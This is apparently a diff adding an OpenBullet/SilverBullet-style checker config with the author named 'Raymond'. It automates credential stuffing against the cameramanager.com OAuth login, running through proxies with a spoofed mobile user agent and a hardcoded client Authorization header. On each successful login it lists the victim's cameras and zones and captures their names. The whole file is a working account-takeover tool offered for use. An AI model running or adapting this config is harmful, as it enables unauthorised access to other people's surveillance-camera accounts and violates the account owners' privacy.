@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Pronet_Api",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T21:56:19.9463287+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Raymond",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Pronet_Api",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "USER2" 
+
+FUNCTION URLEncode "<PASS>" -> VAR "PASS2" 
+
+REQUEST POST "https://rest.cameramanager.com/oauth/token" 
+  CONTENT "username=<USER2>&password=<PASS2>&grant_type=password&scope=write" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Kameram/22.5.1 (Asus ASUS_Z01QD; 7.1.2)" 
+  HEADER "Authorization: Basic QU5EUk9JRC1kMzFiZDFiZi00YmZkLTRkZWUtYmMzYy04YjE5ZTY2ZWVkNTU6QU5EUk9JRA==" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: rest.cameramanager.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 82" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error_description\":\"Invalid credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "access_token" 
+
+REQUEST GET "https://rest.cameramanager.com/rest/v2.2/cameras" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Kameram/22.5.1 (Asus ASUS_Z01QD; 7.1.2)" 
+  HEADER "Authorization: bearer <access_token>" 
+  HEADER "Host: rest.cameramanager.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "accountId" -> VAR "accountId" 
+
+REQUEST GET "https://rest.cameramanager.com/rest/v2.0/zones?embedCameras=true&accountId=<accountId>" 
+  
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Kameram/22.5.1 (Asus ASUS_Z01QD; 7.1.2)" 
+  HEADER "Authorization: bearer <access_token>" 
+  HEADER "Host: rest.cameramanager.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "name" Recursive=TRUE CreateEmpty=FALSE -> CAP "Kamera İsimleri" 
+
